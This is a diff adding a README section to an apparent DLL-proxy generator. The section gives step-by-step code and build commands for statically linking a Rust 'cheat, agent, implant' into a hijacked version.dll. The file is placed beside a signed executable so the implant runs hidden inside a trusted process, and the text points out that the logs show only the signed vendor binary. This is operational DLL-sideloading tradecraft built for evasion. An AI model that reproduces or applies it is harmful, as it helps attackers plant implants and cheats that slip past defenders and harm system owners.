@@ -204,6 +204,108 @@ Expected output:
 ============================================================
 ```
 
+## Example: Linking a Rust Cheat / Implant
+
+If you already have a project written in Rust (a cheat, agent, implant, etc.), you can statically link it into the proxy DLL. The result is a single `.dll` file — your Rust code runs inside the hijacked process with no extra files dropped to disk.
+
+### 1. Compile your Rust project as a static library
+
+In your Rust project's `Cargo.toml`, set the crate type to `staticlib`:
+
+```toml
+[lib]
+crate-type = ["staticlib"]
+```
+
+Expose an entry point with C linkage:
+
+```rust
+// src/lib.rs
+
+#[no_mangle]
+pub extern "C" fn cheat_main() {
+    // your cheat / implant / agent logic here
+    // this runs in its own thread inside the hijacked process
+}
+```
+
+Build it:
+
+```
+cargo build --release
+```
+
+This produces `target\release\your_crate.lib`.
+
+### 2. Generate the proxy project
+
+```
+python generate.py C:\Windows\System32\version.dll --payload --embed --block
+```
+
+### 3. Edit `payload.c` to call your Rust code
+
+Replace the generated `payload.c` with:
+
+```c
+#include "payload.h"
+
+extern void cheat_main(void);
+
+DWORD WINAPI payload_main(LPVOID lpParam) {
+    (void)lpParam;
+    cheat_main();
+    return 0;
+}
+```
+
+### 4. Link the Rust `.lib` into the build
+
+**MSVC** — edit `build_msvc.bat`, add the `.lib` and its dependencies to the link line:
+
+```bat
+cl /nologo /LD ^
+    proxy.c payload.c trampolines.obj resource.res ^
+    /link /DEF:exports.def /OUT:version.dll ^
+    C:\path\to\your_crate.lib ^
+    kernel32.lib user32.lib ws2_32.lib advapi32.lib userenv.lib ^
+    ntdll.lib bcrypt.lib msvcrt.lib
+```
+
+> The extra system libs (`ws2_32`, `advapi32`, `userenv`, `bcrypt`, etc.) are pulled in by the Rust standard library. If you get unresolved symbols at link time, add the missing lib — the linker error will tell you which one.
+
+**MinGW** — edit the `Makefile`:
+
+```makefile
+RUSTLIB = /path/to/your_crate.lib
+
+$(TARGET): $(OBJECTS)
+    $(CC) $(CFLAGS) -o $@ $^ $(DEF) $(RUSTLIB) -lkernel32 -luser32 -lws2_32 -ladvapi32 -luserenv -lbcrypt -lntdll
+```
+
+### 5. Build and deploy
+
+```
+build_msvc.bat
+```
+
+The output `version.dll` is a single file containing:
+- The proxy export table (forwards all calls to the embedded original)
+- The embedded original `version.dll` (extracted at runtime)
+- Your entire Rust cheat, statically linked in
+
+Drop it next to the target `.exe`. When the process starts, it loads your proxy as `version.dll`, all API calls work normally, and your Rust code runs in a separate thread — inside a legitimate signed process.
+
+### Deployment layout
+
+```
+target_app/
+├── legit_signed_app.exe     # Trusted binary that loads version.dll
+└── version.dll              # Your proxy (contains original + your Rust code)
+```
+
+That's it. One file. The `.exe` in the logs is a signed vendor binary.
+
 ## Non-Embed Mode
 
 Without `--embed`, the proxy loads the original DLL from disk at runtime. Rename the original and place it alongside the proxy:
